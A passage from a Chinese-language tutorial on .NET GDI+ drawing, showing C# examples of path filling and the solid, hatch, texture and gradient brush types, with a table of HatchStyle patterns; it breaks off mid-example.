<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Font&#160;font&#160;=&#160;new&#160;Font(&#34;&#21326;&#25991;&#34892;&#26999;&#34;,&#160;40);&#160;//&#160;&#21019;&#24314;Font&#23383;&#20307;&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.DrawString(&#34;&#23396;&#24433;&#39;Blog&#160;&#27426;&#36814;&#24744;&#65281;&#34;,&#160;font,&#160;new&#160;SolidBrush(Color.Black),&#160;30,&#160;60);&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行结果如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/8bdedb9d6c5d9eb21cb68cdd376814dc.jpg" alt=""></p>
<h3 id="4-6_填充路径">4.6 填充路径</h3><p>填充路径的语法定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#22635;&#20805;&#160;System.Drawing.Drawing2D.GraphicsPath&#160;&#30340;&#20869;&#37096;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#30830;&#23450;&#22635;&#20805;&#29305;&#24615;&#30340;&#160;System.Drawing.Brush&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;path:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Drawing2D.GraphicsPath&#65292;&#23427;&#34920;&#31034;&#35201;&#22635;&#20805;&#30340;&#36335;&#24452;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#160;-&#160;&#25110;&#160;-&#160;path&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;FillPath(Brush&#160;brush,&#160;GraphicsPath&#160;path);</span><br></pre></td></tr></table></figure>
<p>根据上述语法定义，可写出如下示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillRectangle(new&#160;SolidBrush(Color.White),&#160;this.ClientRectangle);&#160;&#160;//&#160;&#20197;&#30333;&#33394;&#30011;&#21047;&#22635;&#20805;&#24403;&#21069;&#31383;&#20307;&#10;&#160; &#160; &#160; &#160; &#160; &#160; //&#160;&#21019;&#24314;&#32447;&#32452;&#10;&#160; &#160; &#160; &#160; &#160; &#160; GraphicsPath&#160;path&#160;=&#160;new&#160;GraphicsPath(new&#160;Point[]&#160;&#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; new&#160;Point(40,140),&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; new&#160;Point(275,200),&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; new&#160;Point(105,225),&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; new&#160;Point(190,300),&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; new&#160;Point(50,350),&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; new&#160;Point(20,180)&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#125;,&#160;new&#160;byte[]&#160;&#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; (byte)PathPointType.Start,&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; (byte)PathPointType.Bezier,&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; (byte)PathPointType.Bezier,&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; (byte)PathPointType.Bezier,&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; (byte)PathPointType.Line,&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; (byte)PathPointType.Line&#10;&#160; &#160; &#160; &#160; &#160; &#160; &#125;);&#10;&#160; &#160; &#160; &#160; &#160; &#160; //&#160;&#36335;&#24452;&#31508;&#21047;&#10;&#160; &#160; &#160; &#160; &#160; &#160; PathGradientBrush&#160;pathGradientBrush&#160;=&#160;new&#160;PathGradientBrush(path);&#10;&#160; &#160; &#160; &#160; &#160; &#160; //&#160;&#35774;&#32622;&#36335;&#24452;&#20013;&#30340;&#28857;&#23545;&#24212;&#30340;&#39068;&#33394;&#25968;&#32452;&#10;&#160; &#160; &#160; &#160; &#160; &#160; pathGradientBrush.SurroundColors&#160;=&#160;new&#160;Color[]&#160;&#123;&#160;Color.Green,&#160;Color.Yellow,&#160;Color.Red,&#160;Color.Blue,&#160;Color.Orange,&#160;Color.White&#160;&#125;;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillPath(pathGradientBrush,&#160;path);&#160;//&#160;&#22635;&#20805;&#36335;&#24452;&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行结果如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/1023f8633018bb226c1a0a1fc2b336bf.jpg" alt=""></p>
<p>注意：GraphicsPath类位于命名空间“System.Drawimg.Drawimg2D”中，表示一系列相互连接的直线和曲线。</p>
<h2 id="5_画刷和画刷类型">5 画刷和画刷类型</h2><p>Brush类型是一个抽象类，所以它不能被实例化，也就是不能直接应用，但是我们可以利用他的派生类，如：HatchBrush、SolidBrush和TextureBrush等。</p>
<p>画刷类型一般在“System.Drawing”命名空间中，如果应用HatchBrush和GradientBrush画刷，需要在程序中引入“System.Drawing2D”命名空间。</p>
<h3 id="5-1_SolidBrush(单色画刷)">5.1 SolidBrush(单色画刷)</h3><p>它是一种一般的画刷，通常只用一种颜色去填充GDI+图形，例如如下示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; SolidBrush&#160;solidBrushR&#160;=&#160;new&#160;SolidBrush(Color.Red);&#160;//&#160;&#32418;&#33394;&#30011;&#21047;&#10;&#160; &#160; &#160; &#160; &#160; &#160; SolidBrush&#160;solidBrushG&#160;=&#160;new&#160;SolidBrush(Color.Green);&#160;&#160;&#160;//&#160;&#32511;&#33394;&#30011;&#21047;&#10;&#160; &#160; &#160; &#160; &#160; &#160; SolidBrush&#160;solidBrushB&#160;=&#160;new&#160;SolidBrush(Color.Blue);&#160;&#160;&#160;&#160;//&#160;&#34013;&#33394;&#30011;&#21047;&#10;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillEllipse(solidBrushG,&#160;20,&#160;40,&#160;60,&#160;70);&#160;&#160;//&#160;&#29992;&#32511;&#33394;&#30011;&#21047;&#22635;&#20805;&#19968;&#20010;&#26925;&#22278;&#10;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Rectangle&#160;rect&#160;=&#160;new&#160;Rectangle(0,&#160;0,&#160;200,&#160;100);&#160;&#160;&#160;&#160;&#160;//&#160;&#30697;&#24418;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillPie(solidBrushB,&#160;0,&#160;0,&#160;200,&#160;40,&#160;0.0f,&#160;30.0f);&#160;&#160;//&#160;&#22635;&#20805;&#39292;&#22270;&#10;&#10;&#160; &#160; &#160; &#160; &#160; &#160; //&#160;&#32452;&#25104;&#22810;&#36793;&#24418;&#30340;&#28857;&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point1&#160;=&#160;new&#160;PointF(50.0f,&#160;250.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point2&#160;=&#160;new&#160;PointF(100.0f,&#160;25.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point3&#160;=&#160;new&#160;PointF(150.0f,&#160;40.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point4&#160;=&#160;new&#160;PointF(200.0f,&#160;50.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point5&#160;=&#160;new&#160;PointF(250.0f,&#160;100.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF[]&#160;curvePoints&#160;=&#160;&#123;&#160;point1,&#160;point2,&#160;point3,&#160;point4,&#160;point5&#160;&#125;;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillPolygon(solidBrushR,&#160;curvePoints);&#160;&#160;//&#160;&#22635;&#20805;&#22810;&#36793;&#24418;&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>运行效果如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/e5675bb4aad395e4986d2ebdb8dd0c14.jpg" alt=""></p>
<h3 id="5-2_HatchBrush(阴影画刷)">5.2 HatchBrush(阴影画刷)</h3><p>HatchBrush类位于“System.Drawing.Drawing2D”命名空间中。阴影画刷有两种颜色：前景色和背景色，以及6种阴影。前景色定义线条的颜色，背景色定义线条之间间隙的颜色。</p>
<p>HatchBrush类有两个构造函数：</p>
<ol>
<li><p><code>public HatchBrush(HatchStyle, Color foreColor);</code></p>
</li>
<li><p><code>public HatchBrush(HatchStyle, Color foreColor, Color backColor);</code></p>
</li>
</ol>
<p>HatchStyle枚举值指定可用于HatchBrush对象的不同图案，主要成员如下：</p>
<p>HatchStyle枚举图案主要成员</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>BackwardDiagonal</td>
<td>从右上到左下的对角线的线条图案</td>
<td>Cross</td>
<td>指定交叉的水平线和垂直线</td>
</tr>
<tr>
<td>DarkDownwardDiagonal</td>
<td>指定从顶点到底点向右倾斜的对角线，其两边夹角比ForwardDiagonal小50%，宽度是其两倍。此阴影图案不是锯齿消除的</td>
<td>DarkHorizontal</td>
<td>指定水平线的两边夹角比Horizontal小50%，并且宽度是Horizontal的两倍</td>
</tr>
<tr>
<td>DarkUpwardDiagonal</td>
<td>指定从顶点到底点向左倾斜的对角线，其两边夹角比BackwardDiagonal小50%，宽度是其两倍，但这些直线不是锯齿消除的</td>
<td>DarkVertical</td>
<td>指定垂直线的两边夹角比Vertical小50%，并且宽度是其两倍</td>
</tr>
<tr>
<td>DashedDownwardDiagonal</td>
<td>指定虚线对角线，这些对角线从顶点到底点向右倾斜</td>
<td>DashedHorizontal</td>
<td>指定虚线水平线</td>
</tr>
<tr>
<td>DashedUpwardDiagonal</td>
<td>指定虚线对角线，这些对角线从顶点到底点向左倾斜</td>
<td>DashedVertical</td>
<td>指定虚线垂直线</td>
</tr>
<tr>
<td>DiagonalBrick</td>
<td>指定具有分层砖块外观的阴影，它从顶点到底点向左倾斜</td>
<td>DiagonalCross</td>
<td>交叉对角线的图案</td>
</tr>
<tr>
<td>Divot</td>
<td>指定具有草皮层外观的阴影</td>
<td>ForwardDiagonal</td>
<td>从坐上到右下分层砖块外观的阴影</td>
</tr>
<tr>
<td>Horizontal</td>
<td>水平线的图案</td>
<td>HorizontalBrick</td>
<td>指定具有水平分层砖块外观的阴影</td>
</tr>
<tr>
<td>LargeGrid</td>
<td>指定阴影样式Cross</td>
<td>LightHorizontal</td>
<td>指定水平线，其两边夹角比Horizontal小50%</td>
</tr>
<tr>
<td>LightVertical</td>
<td>指定垂直线的两边夹角比Vertical小50%</td>
<td>Max</td>
<td>指定阴影样式SolidDiamond</td>
</tr>
<tr>
<td>Min</td>
<td>指定阴影样式Horizontal</td>
<td>NarrowHorizontal</td>
<td>指定水平线的两边夹角比阴影样式Horizontal小75%(或者比LightHorizontal小25%)</td>
</tr>
<tr>
<td>NarrowVertical</td>
<td>指定垂直线的两边夹角比阴影样式Vertical小75%(或者比LightVertical小25%)</td>
<td>OutlineDiamond</td>
<td>指定互相交叉的正向对角线和反向对角线，但这些对角线不是锯齿消除的</td>
</tr>
<tr>
<td>Percent05</td>
<td>指定5%阴影，前景色与背景色的比例为5:100</td>
<td>Percent90</td>
<td>指定90%阴影，前景色与背景色的比例为90:100</td>
</tr>
<tr>
<td>Plaid</td>
<td>指定具有格子花呢材料外观的阴影</td>
<td>Shingle</td>
<td>指定带有对角分层鹅卵石外观的阴影，它从顶点到底点向右倾斜</td>
</tr>
<tr>
<td>SmallCheckerBoard</td>
<td>指定带有期盼外观的阴影</td>
<td>SmallDiamond</td>
<td>指定具有对角放置的棋盘外观的阴影</td>
</tr>
<tr>
<td>Sphere</td>
<td>指定具有球体彼此相邻放置的外观的阴影</td>
<td>Trellis</td>
<td>指定具有格架外观的阴影</td>
</tr>
<tr>
<td>Vertical</td>
<td>垂直线的图案</td>
<td>Wave</td>
<td>指定由代字号”~”构成的水平线</td>
</tr>
<tr>
<td>Weave</td>
<td>指定具有织物外观的阴影</td>
</tr>
</tbody>
</table>
<p>我们随便挑选三个样式，如下示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; //&#160;&#21019;&#24314;&#29992;&#20110;&#30011;&#19977;&#31181;&#19981;&#21516;&#26679;&#24335;&#22270;&#24418;&#30340;&#38452;&#24433;&#30011;&#31508;&#10;&#160; &#160; &#160; &#160; &#160; &#160; HatchBrush&#160;hatchBrushR&#160;=&#160;new&#160;HatchBrush(HatchStyle.DiagonalCross,&#160;Color.Chocolate,&#160;Color.Red);&#10;&#160; &#160; &#160; &#160; &#160; &#160; HatchBrush&#160;hatchBrushG&#160;=&#160;new&#160;HatchBrush(HatchStyle.DashedHorizontal,&#160;Color.Green,&#160;Color.Black);&#10;&#160; &#160; &#160; &#160; &#160; &#160; HatchBrush&#160;hatchBrushB&#160;=&#160;new&#160;HatchBrush(HatchStyle.Weave,&#160;Color.BlueViolet,&#160;Color.Blue);&#10;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillEllipse(hatchBrushR,&#160;20,&#160;80,&#160;60,&#160;20);&#160;&#160;//&#160;&#22635;&#20805;&#26925;&#22278;&#10;&#10;&#160; &#160; &#160; &#160; &#160; &#160; //&#160;&#22635;&#20805;&#39292;&#22270;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Rectangle&#160;rect&#160;=&#160;new&#160;Rectangle(0,&#160;0,&#160;200,&#160;100);&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillPie(hatchBrushB,&#160;0,&#160;0,&#160;200,&#160;40,&#160;0.0f,&#160;30.0f);&#10;&#10;&#160; &#160; &#160; &#160; &#160; &#160; //&#160;&#22635;&#20805;&#33258;&#23450;&#20041;&#22270;&#24418;&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point1&#160;=&#160;new&#160;PointF(50.0f,&#160;250.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point2&#160;=&#160;new&#160;PointF(100.0f,&#160;25.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point3&#160;=&#160;new&#160;PointF(150.0f,&#160;40.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point4&#160;=&#160;new&#160;PointF(250.0f,&#160;50.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF&#160;point5&#160;=&#160;new&#160;PointF(300.0f,&#160;100.0f);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PointF[]&#160;curvePoints&#160;=&#160;&#123;&#160;point1,&#160;point2,&#160;point3,&#160;point4,&#160;point5&#160;&#125;;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillPolygon(hatchBrushG,&#160;curvePoints);&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行结果如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/d74326f9957d82010593c70b119de7dd.jpg" alt=""></p>
<h3 id="5-3_TextureBrush(纹理画刷)">5.3 TextureBrush(纹理画刷)</h3><p>纹理画刷拥有图案，并且通常使用它来填充封闭的图形。为了对它初始化，可以使用一个已经存在的别人设计好了的图案，或使用常用的设计程序设计的自己的图案，同时应该使图案存储为常用图形文件格式，如BMP格式文件，这有一个设计好的位图：“LonelyShadow.bmp”文件，纹理画刷使用的示例代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Bitmap&#160;bitmap&#160;=&#160;new&#160;Bitmap(&#34;LonelyShadow.bmp&#34;);&#160;//&#160;&#26681;&#25454;&#25991;&#20214;&#21019;&#24314;&#21407;&#22987;&#22823;&#23567;&#30340;Bitmap&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; bitmap&#160;=&#160;new&#160;Bitmap(bitmap,&#160;this.ClientRectangle.Size);&#160;&#160;//&#160;&#32553;&#25918;&#21040;&#31383;&#20307;&#22823;&#23567;&#10;&#160; &#160; &#160; &#160; &#160; &#160; TextureBrush&#160;textureBrush&#160;=&#160;new&#160;TextureBrush(bitmap);&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillEllipse(textureBrush,&#160;this.ClientRectangle);&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行效果如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/cca465f1c5c9520eaa3a373e2d0dd393.jpg" alt=""></p>
<h3 id="5-4_LinearGradientBrush_和_PathGradientBrush(渐变画刷)">5.4 LinearGradientBrush 和 PathGradientBrush(渐变画刷)</h3><p>渐变画刷类似于实心画刷，因为他也是基于颜色的，与实心画刷不同的是：渐变画刷使用两种颜色，它的主要特点是：在使用过程中，一种颜色在一段，而另外一种颜色在另一端，在中间，两种颜色融合产生过度或衰减的效果。</p>
<p>渐变画刷有两种：线性画刷和路径画刷(LinearGradientBrush 和 PathGradientBrush)。</p>
<p>其中LinearGradientBrush可以显示线性渐变效果，而PathGradientBrush是路径渐变的可以显示比较具有弹性的渐变效果。</p>
<p><strong>5.4.1 LinearGradientBrush类</strong></p>
<p>LinearGradientBrush类构造函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#160;LinerGradientBrush(Point&#160;point1,&#160;Point&#160;point2,&#160;Color&#160;color1,&#160;Color&#160;color2)&#10;&#10;//&#160;point1:&#160;&#34920;&#31034;&#32447;&#24615;&#28176;&#21464;&#30340;&#36215;&#22987;&#28857;&#30340;Point&#32467;&#26500;&#10;&#10;//&#160;point2:&#160;&#34920;&#31034;&#32447;&#24615;&#28176;&#21464;&#30340;&#32456;&#32467;&#28857;&#30340;Point&#32467;&#26500;&#10;&#10;//&#160;color1:&#160;&#34920;&#31034;&#32447;&#24615;&#28176;&#21464;&#30340;&#36215;&#22987;&#39068;&#33394;&#30340;Color&#32467;&#26500;&#10;&#10;//&#160;color2:&#160;&#34920;&#31034;&#32447;&#24615;&#28176;&#21464;&#30340;&#32467;&#26463;&#39068;&#33394;&#30340;Color&#32467;&#26500;</span><br></pre></td></tr></table></figure>
<p>我们可以写出如下示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; LinearGradientBrush&#160;linearGradientBrush&#160;=&#160;new&#160;LinearGradientBrush(this.ClientRectangle,&#160;Color.White,&#160;Color.Blue,&#160;LinearGradientMode.Vertical);&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.FillRectangle(linearGradientBrush,&#160;this.ClientRectangle);&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行效果如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/4382f57f44e87152b11b8c93cdb74c2a.jpg" alt=""></p>
<p><strong>5.4.2 PathGradientBrush类</strong></p>
<p>PathGradientBrush类的构造函数如下：public PathGradientBrush(GraphicsPath path); // path: GraphicsPath，定义此PathGradientBrush填充区域</p>
<p>PathGradientBrush使用的示例代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Point&#160;centerPoint&#160;=&#160;new&#160;Point(150,&#160;100);&#10;&#160; &#160; &#160; &#160; &#160; &#160; int&#160;R&#160;=&#160;60;&#10;&#160; &#160; &#160; &#160; &#160; &#160; GraphicsPath&#160;path&#160;=&#160;new&#160;GraphicsPath();&#10;&#160; &#160; &#160; &#160; &#160; &#160; path.AddEllipse(centerPoint.X&#160;-&#160;R,&#160;centerPoint.Y&#160;-&#160;R,&#160;R&#160;*&#160;2,&#160;R&#160;*&#160;2);&#10;&#160; &#160; &#160; &#160; &#160; &#160; PathGradientBrush&#160;brush&#160;=&#160;new&#160;PathGradientBrush(path);&#10;&#160; &#160; &#160; &#160; &#160; &#160; brush.CenterPoint&#160;=&#160;centerPoint;&#160;&#160;&#160;&#160;//&#160;&#25351;&#23450;&#36335;&#24452;&#20013;&#24515;&#28857;&#10;&#160; &#160; &#160; &#160; &#160; &#160; 